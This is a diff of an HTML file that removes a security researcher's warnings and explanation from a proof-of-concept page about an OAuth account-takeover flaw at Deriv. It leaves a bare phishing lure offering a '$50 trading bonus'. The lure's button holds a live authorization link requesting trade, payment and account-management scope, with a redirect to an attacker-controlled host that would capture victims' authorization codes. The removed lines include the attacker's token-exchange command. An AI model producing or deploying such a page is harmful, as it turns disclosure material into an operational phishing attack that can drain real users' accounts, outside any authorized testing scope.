@@ -2,106 +2,23 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>PoC — OAuth App Registration Account-Takeover Phishing Link</title>
+<title>Deriv Copy Trading Pro</title>
 <style>
-  body { font-family: -apple-system, Segoe UI, Roboto, sans-serif; max-width: 760px; margin: 40px auto; padding: 0 20px; color: #1a1a1a; background:#fafafa; }
-  h1 { font-size: 1.4rem; }
-  .warn { background:#fff3cd; border:1px solid #ffe08a; padding:14px 18px; border-radius:8px; margin: 18px 0; }
-  .lure { background:#0e1a2b; color:#fff; padding:28px; border-radius:12px; margin: 24px 0; }
-  .lure h2 { margin-top:0; }
-  .lure a.btn { display:inline-block; background:#ff444f; color:#fff; text-decoration:none; padding:12px 22px; border-radius:24px; font-weight:600; margin-top:10px; }
-  code, pre { background:#eee; padding:2px 6px; border-radius:4px; word-break: break-all; }
-  pre { padding:12px; overflow-x:auto; }
-  .section { margin-top: 28px; }
+  body { font-family: -apple-system, Segoe UI, Roboto, sans-serif; margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; background:#f4f4f5; }
+  .lure { background:#0e1a2b; color:#fff; padding:36px 40px; border-radius:16px; max-width:420px; text-align:center; box-shadow:0 8px 30px rgba(0,0,0,.15); }
+  .lure h2 { margin:0 0 10px; font-size:1.4rem; }
+  .lure p { margin:0 0 20px; color:#b8c2d1; }
+  .lure a.btn { display:inline-block; background:#ff444f; color:#fff; text-decoration:none; padding:14px 28px; border-radius:24px; font-weight:600; font-size:1.05rem; }
 </style>
 </head>
 <body>
 
-<div class="warn">
-  <strong>Researcher note — do not click "Claim your $50 trading bonus" below</strong>
-  unless you are authorized to test <code>auth.deriv.com</code> for this Bugcrowd-style
-  engagement (that host is not on the program's 8-host in-scope list; see
-  <code>findings/03-oauth-app-registration-no-validation.md</code> for the full
-  scope reasoning). This file exists to demonstrate exactly what a real
-  phishing page delivering this attack would look like and contain — the link
-  is real and live against a real registered OAuth app, it has simply not
-  been fired in this engagement.
-</div>
-
-<h1>Reproduction: OAuth-based account takeover via unvalidated <code>redirect_uris</code></h1>
-<p>
-  This is what an attacker's landing page looks like. It is a plain static
-  HTML page — no JavaScript required for the attack itself. The victim never
-  leaves a trusted-looking flow: this page is the only "fake" part; the
-  actual login/consent screen the victim sees after clicking is the real,
-  legitimate <code>auth.deriv.com</code> page, because that's what OAuth is
-  for.
-</p>
-
 <div class="lure">
   <h2>🎉 Claim your $50 trading bonus</h2>
-  <p>Deriv Copy Trading Pro is giving away $50 in bonus credit to the first 500
-  traders who connect their account today. Takes 10 seconds — just log in and
-  approve.</p>
+  <p>Deriv Copy Trading Pro is giving away $50 in bonus credit to the first 500 traders who connect their account today.</p>
   <a class="btn" href="https://auth.deriv.com/oauth2/auth?response_type=code&amp;client_id=01a06da7-5ee7-7784-ace8-1851107b7111&amp;redirect_uri=https%3A%2F%2Fattacker-controlled.example%2Fcallback&amp;scope=trade+payment+account_manage&amp;state=IZsubfMsKpzKLuSJa0nCqJaRMShlzbrZ&amp;code_challenge=8cHCLbg5YN4jqGnPESKHs_rMltcGvRMif9bMqjSb_zA&amp;code_challenge_method=S256">
     Claim my $50 bonus →
   </a>
-</div>
-
-<div class="section">
-  <h3>What that link actually is</h3>
-  <p>A real, correctly-formed Deriv OAuth2/PKCE authorization request against a
-  real registered app (<code>ATO_PoC_test_app</code>, registered via the
-  vulnerable <code>POST /devhub/v1/apps</code> endpoint on the in-scope
-  <code>api-core.deriv.com</code> host, requesting <code>trade</code> +
-  <code>payment</code> + <code>account_manage</code> scope):</p>
-<pre>https://auth.deriv.com/oauth2/auth?
-response_type=code
-&client_id=01a06da7-5ee7-7784-ace8-1851107b7111
-&redirect_uri=https%3A%2F%2Fattacker-controlled.example%2Fcallback
-&scope=trade+payment+account_manage
-&state=IZsubfMsKpzKLuSJa0nCqJaRMShlzbrZ
-&code_challenge=8cHCLbg5YN4jqGnPESKHs_rMltcGvRMif9bMqjSb_zA
-&code_challenge_method=S256</pre>
-</div>
-
-<div class="section">
-  <h3>What happens next (per Deriv's own OAuth docs), if fired</h3>
-  <ol>
-    <li>Victim clicks the button, arrives on the real <code>auth.deriv.com</code> login/consent screen.</li>
-    <li>If not already logged in, they log in with their real Deriv credentials — directly to Deriv, nothing is intercepted here.</li>
-    <li>They see a consent screen for "ATO_PoC_test_app" (an attacker could rename this to anything, e.g. "Deriv Copy Trading Pro") requesting Trade, Payment, and Account management access, and click <strong>Allow</strong>.</li>
-    <li>Deriv redirects the browser to:
-      <pre>https://attacker-controlled.example/callback?code=&lt;AUTH_CODE&gt;&amp;state=IZsubfMsKpzKLuSJa0nCqJaRMShlzbrZ</pre>
-      — landing the authorization code on attacker-controlled infrastructure.
-    </li>
-    <li>The attacker (who generated and privately kept the matching <code>code_verifier</code>) exchanges the code server-to-server:
-<pre>curl -X POST https://auth.deriv.com/oauth2/token \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "grant_type=authorization_code" \
-  -d "client_id=01a06da7-5ee7-7784-ace8-1851107b7111" \
-  -d "code=&lt;AUTH_CODE_FROM_CALLBACK&gt;" \
-  -d "code_verifier=zNJzRbJlRW7xTvFocIaCi8jGZyBpag3kpnMJD4HtMsbCp1BdC4OciqEo0LyysN9D3wvEtPc7JnsbDAr7t0Qo3g" \
-  -d "redirect_uri=https://attacker-controlled.example/callback"</pre>
-      and receives a live Bearer <code>access_token</code> scoped to
-      <code>trade</code> + <code>payment</code> + <code>account_manage</code>
-      on the victim's real account — usable directly against
-      <code>api.derivws.com</code>. Full account takeover with fund-movement
-      capability. The victim's password was never touched or known by the
-      attacker.
-    </li>
-  </ol>
-</div>
-
-<div class="section">
-  <h3>Root cause</h3>
-  <p><code>POST /devhub/v1/apps</code> on <code>api-core.deriv.com</code>
-  accepts any <code>redirect_uris</code> value — including bare external
-  domains, wildcard subdomains, and plain HTTP — with no domain-ownership
-  verification, and immediately sets the app to <code>state: "active"</code>
-  with no review. The schema has a <code>domain_verification_challenge</code>
-  field that is never populated, strongly suggesting this control was
-  intended but isn't wired up.</p>
 </div>
 
 </body>
